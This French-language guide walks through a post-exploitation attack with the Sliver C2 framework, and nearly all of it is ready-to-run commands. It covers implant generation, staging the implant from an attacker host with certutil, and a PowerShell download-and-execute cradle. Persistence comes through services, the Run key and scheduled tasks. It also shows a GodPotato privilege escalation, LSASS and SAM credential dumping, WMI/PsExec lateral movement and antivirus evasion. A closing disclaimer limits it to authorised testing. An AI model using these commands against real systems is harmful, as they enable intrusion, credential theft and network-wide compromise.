# Guide Complet : Simulation d'Attaque Post-Exploitation avec Silver C2 dans Kali Linux

## Table des Matières
1. [Prérequis et Installation](#1-prérequis-et-installation)
2. [Configuration Initiale du Serveur](#2-configuration-initiale-du-serveur)
3. [Génération d'Implants](#3-génération-dimplants)
4. [Configuration des Listeners](#4-configuration-des-listeners)
5. [Déploiement et Exécution](#5-déploiement-et-exécution)
6. [Techniques de Post-Exploitation](#6-techniques-de-post-exploitation)
7. [Persistence et Mouvement Latéral](#7-persistence-et-mouvement-latéral)
8. [Évasion et Techniques Avancées](#8-évasion-et-techniques-avancées)
9. [Nettoyage et Recommandations](#9-nettoyage-et-recommandations)

---

## 1. Prérequis et Installation

### 1.1 Mise à jour du système Kali Linux
```bash
sudo apt update && sudo apt upgrade -y
```

### 1.2 Installation de Sliver C2

#### Option A : Installation via APT (Recommandée)
```bash
sudo apt install sliver -y
```

#### Option B : Installation via Snap
```bash
sudo snap install sliver
```

#### Option C : Compilation depuis les sources
```bash
# Installation des dépendances
sudo apt install git golang-go mingw-w64 -y

# Clonage du repository
git clone https://github.com/BishopFox/sliver.git
cd sliver

# Compilation
make
```

### 1.3 Vérification de l'installation
```bash
sliver-server version
sliver-client --help
```

---

## 2. Configuration Initiale du Serveur

### 2.1 Démarrage du serveur Sliver
```bash
# Démarrage en mode single-user
sudo sliver-server
```

### 2.2 Configuration multi-utilisateur (optionnel)
```bash
# Génération d'un fichier de configuration client
sudo sliver-server operator --name [nom_operateur] --lhost [IP_serveur]

# Copie du fichier de configuration généré
cp /root/.sliver-client/configs/[nom_operateur]_[IP].cfg ~/sliver-client.cfg
```

### 2.3 Connexion client
```bash
# Dans un nouveau terminal
sliver-client
```

---

## 3. Génération d'Implants

### 3.1 Génération d'un implant Windows basique
```bash
# Implant session (connexion immédiate)
generate --mtls [IP_SERVEUR]:[PORT] --os windows --arch amd64 --format exe --save /tmp/implant.exe

# Implant beacon (connexion périodique)
generate beacon --mtls [IP_SERVEUR]:[PORT] --os windows --arch amd64 --format exe --save /tmp/beacon.exe
```

### 3.2 Génération d'implants avec options avancées
```bash
# Implant avec personnalisation
generate --mtls [IP_SERVEUR]:443 \
    --os windows \
    --arch amd64 \
    --format exe \
    --name MonImplant \
    --jitter 30s \
    --limit-datetime "2024-12-31 23:59:59" \
    --save /tmp/implant_custom.exe
```

### 3.3 Génération d'implants pour d'autres systèmes
```bash
# Implant Linux
generate --mtls [IP_SERVEUR]:443 --os linux --arch amd64 --format elf --save /tmp/implant_linux

# Implant macOS
generate --mtls [IP_SERVEUR]:443 --os darwin --arch amd64 --format macho --save /tmp/implant_macos
```

---

## 4. Configuration des Listeners

### 4.1 Listener mTLS (Mutual TLS)
```bash
# Démarrage d'un listener mTLS
mtls --lport 443
```

### 4.2 Listener HTTP/HTTPS
```bash
# Listener HTTP
http --lport 80

# Listener HTTPS
https --lport 443 --cert /path/to/cert.pem --key /path/to/key.pem
```

### 4.3 Listener DNS
```bash
# Listener DNS
dns --domains example.com --lport 53
```

### 4.4 Vérification des listeners actifs
```bash
jobs
```

---

## 5. Déploiement et Exécution

### 5.1 Transfert de l'implant vers la cible
```bash
# Via serveur web Python
python3 -m http.server 8080

# Via netcat
nc -lvp 1234 < implant.exe
```

### 5.2 Exécution sur la machine cible
```bash
# Sur la machine Windows cible
certutil -urlcache -split -f http://[IP_ATTAQUANT]:8080/implant.exe implant.exe
.\implant.exe
```

### 5.3 Vérification des connexions
```bash
# Liste des sessions actives
sessions

# Interaction avec une session
use [SESSION_ID]
```

---

## 6. Techniques de Post-Exploitation

### 6.1 Reconnaissance système
```bash
# Informations système
info

# Liste des processus
ps

# Variables d'environnement
getenv

# Informations réseau
netstat

# Liste des utilisateurs
getuid
whoami
```

### 6.2 Enumération du système
```bash
# Structure des répertoires
ls
pwd

# Recherche de fichiers sensibles
find / -name "*.txt" -type f 2>/dev/null
find / -name "*password*" -type f 2>/dev/null
find / -name "*config*" -type f 2>/dev/null
```

### 6.3 Gestion des fichiers
```bash
# Téléchargement de fichiers
download /path/to/remote/file /local/path/

# Upload de fichiers
upload /local/file /remote/path/

# Lecture de fichiers
cat /etc/passwd
cat /etc/shadow
```

### 6.4 Exécution de commandes
```bash
# Exécution de commandes shell
shell

# Exécution de commandes PowerShell (Windows)
execute-shellcode

# Assemblies .NET (Windows)
execute-assembly /path/to/assembly.exe
```

---

## 7. Persistence et Mouvement Latéral

### 7.1 Techniques de persistence Windows
```bash
# Service Windows
execute sc create MaliciousService binpath= "C:\path\to\implant.exe"
execute sc config MaliciousService start= auto

# Registre Windows
execute reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousApp" /t REG_SZ /d "C:\path\to\implant.exe"

# Tâche planifiée
execute schtasks /create /sc onlogon /tn "MaliciousTask" /tr "C:\path\to\implant.exe"
```

### 7.2 Escalade de privilèges
```bash
# Énumération des privilèges
execute whoami /priv

# Exploitation SeImpersonatePrivilege avec GodPotato
upload GodPotato.exe C:\temp\GodPotato.exe
execute C:\temp\GodPotato.exe -cmd "cmd /c C:\path\to\implant.exe"
```

### 7.3 Collecte d'informations d'identification
```bash
# Dump de la mémoire LSASS (nécessite des privilèges admin)
execute procdump.exe -ma lsass.exe lsass.dmp

# Extraction des hashes SAM
execute reg save HKLM\SAM sam.hive
execute reg save HKLM\SYSTEM system.hive
```

### 7.4 Mouvement latéral
```bash
# Scan réseau
execute nmap -sn 192.168.1.0/24

# WMI (Windows)
execute wmic /node:"TARGET_IP" /user:"DOMAIN\USER" /password:"PASSWORD" process call create "cmd.exe /c C:\path\to\implant.exe"

# PsExec
execute psexec.exe \\TARGET_IP -u DOMAIN\USER -p PASSWORD C:\path\to\implant.exe
```

---

## 8. Évasion et Techniques Avancées

### 8.1 Évasion d'antivirus
```bash
# Génération d'implant obfusqué
generate --mtls [IP]:443 --os windows --format exe --evasion --save /tmp/evasive_implant.exe

# Utilisation de stagers
generate stager --lhost [IP] --lport 443 --format exe --save /tmp/stager.exe
```

### 8.2 Chiffrement et communication
```bash
# Configuration de la communication chiffrée
profiles new --mtls [IP]:443 --skip-symbols --name CustomProfile

# Utilisation du profil personnalisé
generate --profile CustomProfile --os windows --format exe --save /tmp/encrypted_implant.exe
```

### 8.3 Extensions et modules Armory
```bash
# Installation d'extensions depuis Armory
armory install kerberoast
armory install sharp-collection

# Utilisation des extensions
kerberoast
sharp-collection
```

### 8.4 Techniques de living-off-the-land
```bash
# PowerShell
execute powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://[IP]/script.ps1')"

# Windows Management Instrumentation
execute wmic process call create "powershell.exe -ep bypass -c [COMMAND]"

# Certutil pour téléchargement
execute certutil -urlcache -split -f http://[IP]/file.exe file.exe
```

---

## 9. Nettoyage et Recommandations

### 9.1 Nettoyage des traces
```bash
# Suppression des fichiers temporaires
execute del C:\temp\*.exe /f /q

# Nettoyage du registre
execute reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousApp" /f

# Arrêt des services créés
execute sc stop MaliciousService
execute sc delete MaliciousService

# Suppression des tâches planifiées
execute schtasks /delete /tn "MaliciousTask" /f
```

### 9.2 Arrêt propre de Sliver
```bash
# Fermeture des sessions
sessions -k [SESSION_ID]

# Arrêt des listeners
jobs -k [JOB_ID]

# Sortie du client
exit
```

### 9.3 Recommandations de sécurité
- **Utilisez uniquement dans un environnement de laboratoire contrôlé**
- **Obtenez toujours une autorisation écrite avant tout test**
- **Documentez toutes les actions effectuées**
- **Nettoyez complètement après les tests**
- **Respectez les lois locales et internationales**

---

## Commandes Utiles de Référence

### Gestion des sessions
```bash
sessions                    # Liste des sessions actives
sessions -i [ID]           # Interaction avec une session
sessions -k [ID]           # Terminer une session
background                 # Mettre la session en arrière-plan
```

### Gestion des jobs
```bash
jobs                       # Liste des jobs actifs
jobs -k [ID]              # Terminer un job
```

### Aide et documentation
```bash
help                       # Aide générale
help [COMMAND]            # Aide pour une commande spécifique
```

---

**⚠️ AVERTISSEMENT IMPORTANT ⚠️**

Ce guide est destiné uniquement à des fins éducatives et de test de sécurité autorisés. L'utilisation de ces techniques sur des systèmes sans autorisation explicite est illégale et peut entraîner des poursuites judiciaires. Respectez toujours les lois locales et internationales, ainsi que les politiques de votre organisation.

---

**Date de création :** Janvier 2025  
**Version :** 1.0  
**Framework :** Sliver C2 by Bishop Fox